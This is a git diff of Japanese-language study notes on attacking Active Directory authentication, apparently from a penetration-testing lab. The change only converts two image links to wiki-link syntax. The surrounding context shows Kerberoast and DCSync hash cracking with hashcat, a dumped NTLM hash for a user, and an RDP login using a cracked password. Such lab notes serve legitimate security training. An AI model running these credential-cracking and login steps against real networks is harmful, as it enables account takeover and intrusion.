@@ -60,7 +60,7 @@ sudo hashcat -m 13100 hashes.kerberoast3 rockyou_1.txt -r /usr/share/hashcat/rul
 - kerberoast コマンドを指定
 - /outfile hashes.kerberoast
 
-![](../../../assets/images/Pasted%20image%2020260526050544.png)
+![[Pasted image 20260526050544.png]]
 
 ```
 [*] SamAccountName         : iis_service
@@ -125,7 +125,7 @@ maria:2a944a58d4ffa77137b2c587e6ed7626
 hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-![](11_Active_Directory/02_AD認証への攻撃/assets/images/Pasted%20image%2020250819012411.png)
+![[Pasted image 20250819012411.png]]
 
 ```zsh
 xfreerdp3 /cert:ignore /u:maria /d:corp.com /p:passwordt_1415 /v:192.168.158.70 /dynamic-resolution
